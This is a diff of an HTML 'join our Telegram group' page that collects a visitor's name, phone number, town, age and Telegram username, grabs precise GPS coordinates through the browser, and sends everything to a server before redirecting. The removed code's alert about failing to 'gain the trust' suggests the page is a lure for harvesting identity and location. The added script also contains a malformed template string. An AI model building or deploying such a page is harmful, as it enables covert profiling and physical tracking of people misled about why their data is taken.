@@ -1,153 +1,213 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Join Devil's Telegram Group</title>
-  <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      overflow: hidden;
-      font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(135deg, #5f2c82, #49a09d);
-      color: white;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex-direction: column;
-      transition: background 0.2s;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Join Telegram Group</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #5f2c82, #49a09d);
+            color: white;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            transition: background 0.3s;
+        }
 
-    h2 {
-      font-size: 2rem;
-      margin-bottom: 1rem;
-      animation: typing 3s steps(22), blink 0.5s step-end infinite alternate;
-      white-space: nowrap;
-      overflow: hidden;
-      border-right: 3px solid white;
-    }
+        h2 {
+            font-size: 2rem;
+            margin-bottom: 1rem;
+            animation: typing 3s steps(22), blink 0.5s step-end infinite alternate;
+            white-space: nowrap;
+            overflow: hidden;
+            border-right: 3px solid white;
+        }
 
-    @keyframes typing {
-      from { width: 0 }
-      to { width: 100% }
-    }
+        @keyframes typing {
+            from { width: 0; }
+            to { width: 100%; }
+        }
 
-    @keyframes blink {
-      from { border-color: transparent }
-      to { border-color: white }
-    }
+        @keyframes blink {
+            from { border-color: transparent; }
+            to { border-color: white; }
+        }
 
-    form {
-      background: rgba(255, 255, 255, 0.1);
-      backdrop-filter: blur(10px);
-      padding: 20px;
-      border-radius: 16px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.3);
-    }
+        .form-container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 20px;
+            border-radius: 16px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
 
-    input {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      border: none;
-      border-radius: 8px;
-      font-size: 1rem;
-      outline: none;
-      transition: 0.3s;
-    }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 8px;
+            font-size: 1rem;
+            outline: none;
+            transition: 0.3s;
+        }
 
-    input:focus {
-      box-shadow: 0 0 8px #fff;
-      background: #fff;
-      color: #333;
-    }
+        input:focus {
+            background: #fff;
+            color: #333;
+            box-shadow: 0 0 8px #fff;
+        }
 
-    button {
-      background: #ffffff;
-      color: #333;
-      padding: 10px 20px;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      font-weight: bold;
-      transition: transform 0.2s, box-shadow 0.3s;
-    }
+        button {
+            background: #ffffff;
+            color: #333;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: transform 0.2s, box-shadow 0.3s;
+        }
 
-    button:hover {
-      transform: scale(1.05);
-      box-shadow: 0 0 10px #fff;
-    }
-  </style>
+        button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 10px #fff;
+        }
+
+        .location-tag {
+            position: absolute;
+            bottom: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            color: white;
+            font-size: 1rem;
+        }
+
+        .thank-you {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #ffffff;
+            color: #333;
+            padding: 20px;
+            border-radius: 8px;
+            font-size: 1.2rem;
+            display: none;
+            text-align: center;
+            animation: boot-up 2s;
+        }
+
+        @keyframes boot-up {
+            0% { opacity: 0; transform: translate(-50%, -50%) scale(0.5); }
+            100% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+        }
+
+        .progress-bar-container {
+            width: 100%;
+            background-color: #ddd;
+            border-radius: 25px;
+            margin-top: 20px;
+            height: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .progress-bar {
+            height: 100%;
+            background-color: #4caf50;
+            border-radius: 25px;
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+
+    </style>
 </head>
 <body>
 
-  <h2>Fill the form to join</h2>
-  <form id="userForm">
-    <input type="text" name="fullname" placeholder="Full Name" required>
-    <input type="text" name="phone" placeholder="Phone Number" required>
-    <input type="text" name="towncity" placeholder="Town/City" required>
-    <input type="number" name="age" placeholder="Age" required>
-    <input type="text" name="telegram" placeholder="Telegram Username" required>
-    <input type="hidden" id="latitude" name="latitude">
-    <input type="hidden" id="longitude" name="longitude">
-    <button type="submit">Submit</button>
-  </form>
+    <div class="form-container">
+        <h2>Fill the form to join</h2>
+        <form id="userForm">
+            <input type="text" name="fullname" placeholder="Full Name" required>
+            <input type="text" name="phone" placeholder="Phone Number" required>
+            <input type="text" name="towncity" placeholder="Town/City" required>
+            <input type="number" name="age" placeholder="Age" required>
+            <input type="text" name="telegram" placeholder="Telegram Username" required>
+            <button type="submit">Submit</button>
+        </form>
 
-  <script>
-    // Fetch location on page load
-    window.onload = function() {
-      if (!navigator.geolocation) {
-        alert("Geolocation not supported");
-        return;
-      }
+        <div class="progress-bar-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
 
-      navigator.geolocation.getCurrentPosition(success, error);
+        <div class="location-tag" id="locationTag">Location: Loading...</div>
+    </div>
 
-      function success(position) {
-        const latitude = position.coords.latitude;
-        const longitude = position.coords.longitude;
+    <div class="thank-you" id="thankYouMessage">Thank you for submitting! Redirecting...</div>
 
-        // Populate the hidden fields with latitude and longitude
-        document.getElementById('latitude').value = latitude;
-        document.getElementById('longitude').value = longitude;
-      }
+    <script>
+        let locationTag = document.getElementById('locationTag');
+        let thankYouMessage = document.getElementById('thankYouMessage');
+        let progressBar = document.getElementById('progressBar');
 
-      function error() {
-        alert("Failed to gain the trust. Unable to fetch location.");
-      }
-    };
-
-    // Handle form submit
-    document.getElementById("userForm").addEventListener("submit", function (e) {
-      e.preventDefault();
-
-      const form = e.target;
-      const data = {
-        fullname: form.fullname.value.trim(),
-        phone: form.phone.value.trim(),
-        towncity: form.towncity.value.trim(),
-        age: form.age.value.trim(),
-        telegram: form.telegram.value.trim(),
-        latitude: form.latitude.value,
-        longitude: form.longitude.value
-      };
-
-      fetch("/submit", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      })
-      .then(res => res.json())
-      .then(response => {
-        if (response.link) {
-          window.location.href = response.link;  // Redirect to the Telegram group
-        } else {
-          alert(response.error || "Something went wrong.");
+        // Get location on page load
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((position) => {
+                const { latitude, longitude } = position.coords;
+                locationTag.textContent = Location: ${latitude}, ${longitude};
+            });
         }
-      })
-      .catch(() => alert("Network error."));
-    });
-  </script>
+
+        // Form submission and redirection
+        document.getElementById("userForm").addEventListener("submit", function (e) {
+            e.preventDefault();
+            progressBar.style.width = "25%"; // Start progress bar
+
+            const form = e.target;
+            const data = {
+                fullname: form.fullname.value.trim(),
+                phone: form.phone.value.trim(),
+                towncity: form.towncity.value.trim(),
+                age: form.age.value.trim(),
+                telegram: form.telegram.value.trim(),
+            };
+
+            // Simulate location submission (use real location in production)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    data.latitude = position.coords.latitude;
+                    data.longitude = position.coords.longitude;
+                    progressBar.style.width = "50%"; // Update progress bar
+
+                    fetch("/submit", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(data),
+                    })
+                    .then(res => res.json())
+                    .then(response => {
+                        progressBar.style.width = "100%"; // Complete progress bar
+                        if (response.link) {
+                            thankYouMessage.style.display = 'block';
+                            setTimeout(() => {
+                                window.location.href = response.link;
+                            }, 3000); // Redirect after 3 seconds
+                        } else {
+                            alert(response.error || "Something went wrong.");
+                        }
+                    })
+                    .catch(() => alert("Network error."));
+                });
+            }
+        });
+    </script>
+
 </body>
 </html>
